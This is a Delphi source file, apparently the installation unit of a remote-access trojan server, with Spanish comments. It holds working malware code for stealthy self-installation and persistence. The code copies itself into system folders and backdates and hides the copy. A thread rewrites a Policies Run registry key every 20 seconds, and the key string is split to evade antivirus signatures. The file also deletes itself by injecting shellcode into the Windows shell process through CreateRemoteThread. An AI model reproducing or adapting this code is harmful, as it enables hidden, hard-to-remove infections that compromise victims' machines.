unit UnitInstalacion;

interface

uses
  Windows,
  SysUtils,
  TLHelp32,
  ShellApi,
  SettingsDef,
  UnitVariables,
  UnitFunciones,
  UnitProcess,
  UnitFileManager,
  UnitRegistro;

procedure Instalar();
procedure Desinstalar();

implementation

procedure BorrarseASiMismo(hProcessToInjectTo: cardinal);
 //  coded by FoRSaKeN^    
 //Inyecta un thread en el parametro que se le pase que se encarga de borrar ParamStr(0)
type
  TData = record
    _DeleteFileA: Pointer;
    _ExitThread: Pointer;
    _Sleep:  Pointer;
    _szFile: Pointer;
  end;

  procedure LoadProc(param: Pointer); stdcall;
  var
    Inject: TData;
  begin
    Inject := TData(param^);
    asm
             @del:
             PUSH    1000
             CALL    Inject._Sleep
             PUSH    Inject._szFile
             CALL    Inject._DeleteFileA
             CMP     EAX,0
             JE      @del
             PUSH    0
             CALL    Inject._ExitThread
    end;
  end;

var
  Written, ThreadID: cardinal;
  Params, Proc: Pointer;
  pData:  TData;
  Handle: hWnd;

begin
  if hProcessToInjectTo = 0 then
    exit;
  //------------------------------------------------------------------------------
  pData._DeleteFileA := GetProcAddress(GetModuleHandle(kernel32), 'DeleteFileA');
  pData._ExitThread := GetProcAddress(GetModuleHandle(kernel32), 'ExitThread');
  pData._Sleep  := GetProcAddress(GetModuleHandle(kernel32), 'Sleep');
  //------------------------------------------------------------------------------
  pData._szFile := VirtualAllocEx(hProcessToInjectTo, nil, Length(ParamStr(0)) +
    1, $3000, $40);
  WriteProcessMemory(hProcessToInjectTo, pData._szFile, PChar(ParamStr(0)),
    Length(ParamStr(0)) + 1, Written);
  //------------------------------------------------------------------------------
  Params := VirtualAllocEx(hProcessToInjectTo, nil, SizeOf(TData), $3000, $40);
  WriteProcessMemory(hProcessToInjectTo, Params, @pData, SizeOf(TData), Written);
  if Written <> SizeOf(TData) then
    exit;
  //------------------------------------------------------------------------------
  Proc := VirtualAllocEx(hProcessToInjectTo, nil, 500, $3000, $40);
  WriteProcessMemory(hProcessToInjectTo, Proc, @LoadProc, 500, Written);
  if Written <> 500 then
    exit;
  //------------------------------------------------------------------------------
  Handle := CreateRemoteThread(hProcessToInjectTo, nil, 0, Proc, Params, 0, ThreadID);
  if Handle = 0 then
    exit;
  //------------------------------------------------------------------------------
end;


var
  ThreadAutoInicioID: cardinal;

procedure AutoInicio;
var
  Clave: string;
begin
  while True do
  begin
    //Ahora me agrego al autoinico
    //Metodo policies
    if Configuracion.bArranquePolicies then
    begin
      //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
      //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
      //Y si no, es por pura diversión :)
      Clave := 'HKEY_CURRENT_USE';
      Clave := Clave + 'R\SOFTWARE\Mic';
      Clave := Clave + 'rosoft\Windows\CurrentVersion\Poli';
      Clave := Clave + 'cies';
      AniadirClave(PChar(Clave), '', 'clave');

      Clave := Clave + '\Explorer';
      AniadirClave(PChar(Clave), '', 'clave');

      Clave := Clave + '\Run';
      AniadirClave(PChar(Clave), '', 'clave');

      Clave := Clave + '\' + Configuracion.sPoliciesRegKeyName;
      AniadirClave(PChar(Clave), ParamStr(0), 'REG_SZ');
    end;
    Sleep(20000); //20 sec
  end;
end;

procedure CrearThreadAutoInicio;
//Crea un nuevo Thread en el que el server se agrega al auto inicio cada 20 segundos, para que no lo puedan borrar :)
begin
  BeginThread(nil, 0, @AutoInicio, nil, 0, ThreadAutoInicioID);
end;

function TerminarThreadAutoInicio: boolean;
  //Cierra el thread
begin
  Result := False;
  if ThreadAutoInicioID > 0 then
  begin
    EndThread(ThreadAutoInicioID);
    Result := True;
  end;
end;

procedure Instalar();
var
  i:    cardinal;
  hProcess: THandle;
  Process32: TProcessEntry32;
  SHandle: THandle;
  Pid:  string;
  Next: BOOL;

  FoundFile: TWin32FindData;
  //  H : THandle;
  FileTime:  TFileTime;

begin
  if Configuracion.bCopiarArchivo then //Si me tengo que copiar entonces...
  begin
    //Reemplaza las rutas adecuadas
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%WinDir%\', FindWindowsDir(), [rfReplaceAll, rfIgnoreCase{Ignora Mayus ó Minus}]);
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%SysDir%\', FindSystemDir(), [rfReplaceAll, rfIgnoreCase{Ignora Mayus ó Minus}]);
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%TempDir%\', FindTempDir(), [rfReplaceAll, rfIgnoreCase{Ignora Mayus ó Minus}]);
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%RootDir%\', FindRootDir(), [rfReplaceAll, rfIgnoreCase{Ignora Mayus ó Minus}]);
    //Si la carpeta no existe la intento crear
    if not DirectoryExists(Configuracion.sCopyTo) then
      try
        for i := 0 to 5 do
        begin
          CreateDir(Configuracion.sCopyTo);
          Sleep(10);
        end;
      except
      end;
    if not DirectoryExists(Configuracion.sCopyTo) then
      Configuracion.sCopyTo := 'C:\';
    //Osea que no la pude crear y sigue sin existir. En ese caso me instalo en el C:


    if ParamStr(0) = Configuracion.sCopyTo + Configuracion.sFileNameToCopy = False then
      //Si no me he copiado
      //tengo que copiarme y ejecutar la copia
    begin
      if FileExists(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
        //Osea que ya existe el archivo del server pero no soy yo! debe ser una version vieja instalada, borrarla y actualizar
      begin
        try//saca de memoria el servidor viejo, y borra el archivo
          Process32.dwSize := SizeOf(TProcessEntry32);
          SHandle := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if Process32First(SHandle, Process32) then
            repeat
              Next := Process32Next(SHandle, Process32);
              if Next then
                //si tienen el mismo nombre
                if UpperCase(Process32.szExeFile) =
                  UpperCase(Configuracion.sFileNameToCopy) then
                begin
                  Pid := IntToStr(Process32.th32ProcessID);
                  if Pid <> '' then
                  begin
                    //si la ruta del proceso encontrado es la ruta del server
                    if RutaProcesos(StrToInt(Pid)) =
                      (Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
                    begin
                      //Lo asesino para poderlo borrar después
                      try
                        hProcess := OpenProcess(PROCESS_ALL_ACCESS, True, StrToInt64(Pid));
                        TerminateProcess(hProcess, 0);
                      except
                      end;
                    end;
                  end;
                end;
            until not Next;
          CloseHandle(SHandle);
        except
        end;
        //Lo intento borrar repetidamente por si no puedo a la primera :)
        try
          for i := 1 to 10 do
          begin
            BorrarArchivo(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy));
            Sleep(5);
          end;
        except
        end;
      end;
      //Ahora ya me pueedo instalar tranquilamente

      //lo copio en Configuracion.sCopyTo
      CopyFile(PChar(ParamStr(0)), PChar(Configuracion.sCopyTo +
        Configuracion.sFileNameToCopy), True);

      //Si tengo que modificar la fecha...
      if Configuracion.bCopiarConFechaAnterior then
      begin
        SHandle := FindFirstFile(PChar(Configuracion.sCopyTo + '*.*'), FoundFile);
        if SHandle <> INVALID_HANDLE_VALUE then
        begin
          while (string(FoundFile.cFileName) = Configuracion.sFileNameToCopy) or
            (string(FoundFile.cFileName) = '.') or (string(FoundFile.cFileName) = '..') do
            FindNextFile(SHandle, FoundFile);
          if SHandle <> INVALID_HANDLE_VALUE then
            FileTime := FoundFile.ftLastWriteTime;
        end
        else
        begin
          //No hay ningún archivo en la carpeta u ocurrió algun error, entonces escoga una fecha al azar
          FileTime.dwLowDateTime  := Random(4294967295);
          FileTime.dwHighDateTime := Random(4294967295);
        end;
        Windows.FindClose(SHandle);
        SHandle := CreateFile(PChar(Configuracion.sCopyTo +
          Configuracion.sFileNameToCopy), Generic_write, file_share_read or
          file_share_write, nil, open_existing, file_attribute_normal, 0);
        if SHandle <> INVALID_HANDLE_VALUE then
          SetFileTime(sHandle, @FileTime, @FileTime, @FileTime);
        CloseHandle(sHandle);
      end;

      //y lo pongo oculto, readonly y de sistema.
      i := GetFileAttributes(PChar(Configuracion.sCopyTo +
        Configuracion.sFileNameToCopy));
      i := i or $00000002;//faHidden;   //oculto
      i := i or $00000001;//faReadOnly; // solo lectura
      i := i or $00000004;//faSysFile;  //de sistema
      SetFileAttributes(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy), i);

      //Aqui ya estoy copiado, ejecuto el archivo copiado
      if Configuracion.bMelt = True then
        ShellExecute(GetDesktopWindow(), 'open',
          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
          PChar('\melt ' + '"' + ParamStr(0) + '"'), nil, 0)
      else
        //Ejecutar sin pasarle el parametro melt
        ShellExecute(GetDesktopWindow(), 'open',
          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'), '', nil, 0);

      //Y me suicido:
      Halt;
    end;
  end;
  //Ahora me agrego al autoinicio
  CrearThreadAutoInicio;
end;




procedure Desinstalar();
var
  Clave: string;
  //  DeleteBat : TextFile;
  //  i : byte;
  WindowsShellPID: DWord;
begin
  //ahora remuevo las claves que haya agregado al registro
  if Configuracion.bArranquePolicies then
  begin
    //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
    //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
    //Y si no, es por pura diversión :)
    Clave := 'HKEY_CURRENT_USE';
    Clave := Clave + 'R\SOFTWARE\Mic';
    Clave := Clave + 'rosoft\Windows\CurrentVersion\Poli';
    Clave := Clave + 'cies';
    Clave := Clave + '\Explorer\Run\' + Configuracion.sPoliciesRegKeyName;
    BorraClave(Clave);
  end;

  //En esta clave se guarda el nombre del server cuando se cambia desde el cliente
  Clave := 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\WinXpMemory';
  BorraClave(Clave);

  //Borro la captura de pantalla o webcam
  //no es necesario revisar que exista el archivo porque la funcion BorrarArchivo se encarga de ello
  BorrarArchivo(ExtractFileDir(ParamStr(0) + '\jpgcool.dat'));

{  //Borrarse a si mismo... con un bat
  //Primero me quito los permisos readonly, oculto y de sistema para que el bat me pueda borrar
  try
  //saco atributos para poder borrar un archivo sin importar que sea oculto, solo lectura o de sistema
    i := GetFileAttributes( PChar(ParamStr(0)) );
    i := i and $00000002;//faHidden;
    i := i and $00000001;//faReadOnly;
    i := i and $00000004;//faSysFile;
    if SetFileAttributes(PChar(ParamStr(0)), i) then
    //si logro sacar los atributos entonces crea el bat que lo borra el server y se borra a si mismo
    //de lo contrario solo me suicido, y quedará el archivo del servver pero no corriendo
    begin
    AssignFile(DeleteBat, ExtractFileDir(ParamStr(0)) + '\Uninstall.bat');
    Rewrite(DeleteBat);
    WriteLn(DeleteBat,'@Echo OFF');
    WriteLn(DeleteBat, ':Loop');
    WriteLn(DeleteBat, 'del %1');
    WriteLn(DeleteBat, 'if exist %1 goto Loop');
    WriteLn(DeleteBat, 'del %0');
    WriteLn(DeleteBat, 'exit');
    CloseFile(DeleteBat);
    ShellExecute(GetForegroundWindow(), 'open', PChar(ExtractFileDir(ParamStr(0)) + '\Uninstall.bat'), PChar(ParamStr(0)), PChar(ExtractFileDir(ParamStr(0))), SW_HiDE);
    end;
  except
     end; }

  //Borrarse a si mismo con inyección en la shell de windows
  GetWindowThreadProcessID(FindWindow('Shell_TrayWnd', nil), @WindowsShellPID);
  BorrarseASiMismo(OpenProcess(Process_All_Access, False{bInheritHandle},
    WindowsShellPID));

  //y me suicido.
  Halt;
end;

end.
